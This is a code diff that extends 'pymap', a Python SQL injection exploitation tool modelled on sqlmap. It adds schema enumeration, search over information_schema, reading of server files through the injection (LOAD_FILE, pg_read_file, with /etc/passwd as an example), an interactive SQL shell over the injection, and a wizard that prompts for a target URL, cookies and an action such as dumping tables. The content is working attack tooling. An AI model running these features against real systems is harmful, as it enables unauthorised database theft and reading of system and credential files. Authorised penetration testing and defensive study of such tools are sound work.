@@ -1014,6 +1014,8 @@ class Pymap:
 
     # ---- detection pass
     def detect(self):
+        excluded = {x.strip().lower() for x in
+                    (getattr(self.opts, "exclude_param", "") or "").split(",") if x.strip()}
         self._baseline()
         det = Detector(self.client, self.target, self.opts)
         techniques = list(self.opts.technique)
@@ -1024,6 +1026,9 @@ class Pymap:
             return False
 
         for location, name, orig in candidates:
+            if name.lower() in excluded:
+                log(1, f"[-] skipping excluded parameter '{name}'")
+                continue
             if orig == "":
                 orig = "1"
             inj, hint = det.run(location, name, orig, techniques,
@@ -1155,6 +1160,96 @@ class Pymap:
                         continue
                     self.dump_table(dbq, tbl, None, o.limit)
 
+        if o.schema:
+            did = True
+            dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
+                   if d.strip()]
+            if o.exclude_sysdbs:
+                dbs = [d for d in dbs if d.lower() not in SYS_DBS]
+            if o.db:
+                dbs = [d for d in dbs if d == o.db]
+            rows = []
+            for db in dbs:
+                dbq = None if self.dbms == "SQLite" else db
+                tbls = [t.strip() for t in
+                        (ex(self.dialect.q_tables(dbq or "main")) or "").split(",")
+                        if t.strip()]
+                for tbl in tbls:
+                    cols_raw = ex(self.dialect.q_columns(dbq or "main", tbl))
+                    cols = ",".join(c.strip() for c in (cols_raw or "").split(",")
+                                    if c.strip())
+                    rows.append([db, tbl, cols])
+            log(0, f"\n[+] schema ({len(rows)} tables):")
+            print_table(["database", "table", "columns"], rows)
+            evidence({"kind": "schema", "rows": rows})
+
+        if o.search:
+            did = True
+            pat = o.table or o.columns_list
+            if not pat:
+                log(0, "[!] --search needs -T <table-pattern> or -C <column-pattern>")
+            else:
+                matches = self._search(o, pat, ex)
+                log(0, f"\n[+] search results for {pat!r}:")
+                if matches:
+                    print_table(["match"], [[m] for m in matches])
+                else:
+                    log(0, "    (no matches)")
+                evidence({"kind": "search", "pattern": pat, "matches": matches})
+
+        if o.file_read:
+            did = True
+            path = o.file_read
+            q = None
+            if self.dbms == "MySQL":
+                q = f"SELECT LOAD_FILE('{path}')"
+            elif self.dbms == "PostgreSQL":
+                q = f"SELECT pg_read_file('{path}')"
+            elif self.dbms == "MSSQL":
+                q = None
+            if q:
+                val = ex(q)
+                if val:
+                    # MariaDB's XPATH-error channel escapes control chars; restore them
+                    val = (val.replace("\\r\\n", "\n").replace("\\n", "\n")
+                              .replace("\\r", "\r").replace("\\t", "\t"))
+                    outdir = os.path.join(self.outdir, "files")
+                    os.makedirs(outdir, exist_ok=True)
+                    fname = os.path.join(outdir, os.path.basename(path) or "file")
+                    with open(fname, "w") as f:
+                        f.write(val)
+                    head = "\n".join(val.splitlines()[:5])
+                    log(0, f"\n[+] file read OK ({len(val)} chars) -> {fname}")
+                    log(0, "    head:\n" + "\n".join("    " + l for l in head.splitlines()))
+                    evidence({"kind": "file_read", "path": path, "chars": len(val),
+                              "saved": fname})
+                else:
+                    log(0, f"\n[-] could not read {path} (permission, secure_file_priv "
+                           f"or wrong DBMS support)")
+            else:
+                log(0, f"\n[-] --file-read not supported for {self.dbms}")
+
+        if o.sql_shell:
+            did = True
+            log(0, "\n[*] SQL shell through the injection. Scalar queries only "
+                   "(add LIMIT 1). Type 'exit' to quit.")
+            while True:
+                try:
+                    q = input("sql> ").strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    break
+                if not q:
+                    continue
+                if q.lower() in ("exit", "quit", "q"):
+                    break
+                val = ex(q)
+                if val is not None:
+                    log(0, f"[+] {val}")
+                    evidence({"kind": "sql_shell", "query": q, "result": val})
+                else:
+                    log(0, "[-] no scalar result (error? try LIMIT 1 / a subquery)")
+
         if o.sql_query:
             did = True
             log(0, f"\n[*] executing query: {o.sql_query}")
@@ -1168,6 +1263,54 @@ class Pymap:
         if not did:
             log(0, "\n[*] injection confirmed. Use --dbs / --tables / --dump / "
                    "--sql-query to extract data.")
+
+    def _search(self, o, pattern, ex):
+        """Search table names (-T) or column names (-C) across databases."""
+        like = pattern.replace("*", "%")
+        search_cols = bool(o.columns_list) and not o.table
+        if self.dbms == "MySQL":
+            if search_cols:
+                q = ("SELECT GROUP_CONCAT(CONCAT_WS(0x2e,table_schema,table_name,"
+                     f"column_name)) FROM information_schema.columns WHERE column_name "
+                     f"LIKE '{like}'")
+            else:
+                q = ("SELECT GROUP_CONCAT(CONCAT_WS(0x2e,table_schema,table_name)) "
+                     f"FROM information_schema.tables WHERE table_name LIKE '{like}'")
+            raw = ex(q) or ""
+            return [m for m in raw.split(",") if m]
+        if self.dbms == "PostgreSQL":
+            op = "ILIKE"
+            if search_cols:
+                q = (f"SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,',') "
+                     f"FROM information_schema.columns WHERE column_name {op} '{like}'")
+            else:
+                q = (f"SELECT string_agg(table_schema||'.'||table_name,',') "
+                     f"FROM information_schema.tables WHERE table_name {op} '{like}'")
+            raw = ex(q) or ""
+            return [m for m in raw.split(",") if m]
+        # generic fallback: enumerate schema locally and filter
+        dbs = [d.strip() for d in (ex(self.dialect.q_dbs()) or "").split(",")
+               if d.strip()]
+        if o.exclude_sysdbs:
+            dbs = [d for d in dbs if d.lower() not in SYS_DBS]
+        out = []
+        for db in dbs:
+            dbq = None if self.dbms == "SQLite" else db
+            tbls = [t.strip() for t in
+                    (ex(self.dialect.q_tables(dbq or "main")) or "").split(",") if t.strip()]
+            for t in tbls:
+                name = t.lower()
+                hit_t = like.replace("%", "") in name
+                if not search_cols:
+                    if hit_t:
+                        out.append(f"{db}.{t}")
+                    continue
+                cols_raw = ex(self.dialect.q_columns(dbq or "main", t))
+                for c in (cols_raw or "").split(","):
+                    c = c.strip()
+                    if c and like.replace("%", "") in c.lower():
+                        out.append(f"{db}.{t}.{c}")
+        return out
 
     def dump_table(self, db, table, cols, limit):
         ex = self.safe_extract
@@ -1294,7 +1437,7 @@ def build_argparser():
     p = argparse.ArgumentParser(
         prog="pymap", description="pymap - sqlmap-style SQL injection exploitation tool",
         formatter_class=argparse.RawDescriptionHelpFormatter)
-    p.add_argument("-u", "--url", required=True, help="target URL (mark injectable param value with *)")
+    p.add_argument("-u", "--url", help="target URL (mark injectable param value with *)")
     p.add_argument("--data", help='POST data string (e.g. "user=a&pass=b")')
     p.add_argument("--cookie", help="HTTP Cookie header value")
     p.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable)")
@@ -1319,6 +1462,16 @@ def build_argparser():
     p.add_argument("--exclude-sysdbs", action="store_true", help="exclude system databases")
     p.add_argument("--limit", type=int, default=10, help="max rows per table dump (default 10)")
     p.add_argument("--sql-query", dest="sql_query", help="execute arbitrary SQL (scalar result)")
+    p.add_argument("--sql-shell", dest="sql_shell", action="store_true",
+                   help="interactive SQL shell through the injection (type 'exit' to quit)")
+    p.add_argument("--schema", action="store_true",
+                   help="enumerate full schema: database -> tables -> columns")
+    p.add_argument("--search", action="store_true",
+                   help="search table names (-T pattern) or column names (-C pattern) across dbs")
+    p.add_argument("--file-read", dest="file_read",
+                   help="read a server-side file (MySQL LOAD_FILE / PostgreSQL pg_read_file)")
+    p.add_argument("--exclude-param", dest="exclude_param",
+                   help="comma list of parameter names to skip (e.g. csrf_token,session)")
     # flow
     p.add_argument("--delay", type=float, default=0, help="delay seconds between requests")
     p.add_argument("--timeout", type=float, default=30, help="request timeout (default 30)")
@@ -1337,13 +1490,87 @@ def build_argparser():
     return p
 
 
+# ---------------------------------------------------------------- wizard (no -u given)
+def wizard(opts):
+    """Interactive setup when pymap is run without -u: ask target + action."""
+    print(BANNER)
+    print("[*] WIZARD MODE - pymap started without -u\n")
+    try:
+        url = input("Target URL (e.g. http://site/page?id=1): ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return False
+    if not url:
+        return False
+    if "://" not in url:
+        url = "http://" + url
+    opts.url = url
+
+    def _ask(prompt):
+        try:
+            return input(prompt).strip()
+        except (EOFError, KeyboardInterrupt):
+            return ""
+    data = _ask("POST data (enter to skip, e.g. user=a&pass=b): ")
+    if data:
+        opts.data = data
+    cookie = _ask("Cookie header (enter to skip): ")
+    if cookie:
+        opts.cookie = cookie
+    marked = _ask("Mark specific param with * in the URL? (y/N): ").lower()
+    if marked == "y" and "=" in url:
+        opts.url = url.replace("=", "=*")
+
+    print("\nWhat should pymap do after detection?")
+    print("  1) detect + fingerprint only")
+    print("  2) enumerate databases")
+    print("  3) enumerate tables + columns (asks db)")
+    print("  4) dump a table (asks db + table)")
+    print("  5) read a server file (asks path)")
+    print("  6) SQL shell (interactive queries)")
+    print("  7) run an arbitrary SQL query (asks query)")
+    print("  8) everything: dbs + schema")
+    choice = _ask("Choice [1-8]: ") or "1"
+    if choice == "2":
+        opts.dbs = True
+        opts.exclude_sysdbs = True
+    elif choice == "3":
+        opts.tables = True
+        opts.columns = True
+        opts.db = _ask("Database (enter = current): ") or None
+        opts.table = _ask("Table for --columns (enter to skip columns): ") or None
+    elif choice == "4":
+        opts.dump = True
+        opts.db = _ask("Database (enter = current): ") or None
+        opts.table = _ask("Table to dump: ")
+        opts.limit = int(_ask("Row limit [10]: ") or 10)
+    elif choice == "5":
+        opts.file_read = _ask("File path to read (e.g. /etc/passwd): ")
+    elif choice == "6":
+        opts.sql_shell = True
+    elif choice == "7":
+        opts.sql_query = _ask("SQL query (scalar, LIMIT 1): ")
+    elif choice == "8":
+        opts.dbs = True
+        opts.schema = True
+        opts.exclude_sysdbs = True
+    return True
+
+
 def main(argv=None):
     opts = build_argparser().parse_args(argv)
     global VERBOSE
     VERBOSE = opts.verbose
     opts.tamper = [t.strip() for t in opts.tamper.split(",")] if opts.tamper else []
 
-    print(BANNER)
+    if not opts.url:
+        if not wizard(opts):
+            log(0, "[!] no target given. Use -u or run the wizard.")
+            build_argparser().print_help()
+            return 1
+    else:
+        print(BANNER)
+
     log(0, f"[*] starting at {datetime.now(timezone.utc).isoformat()}")
     log(0, f"[*] target: {opts.url}")
 
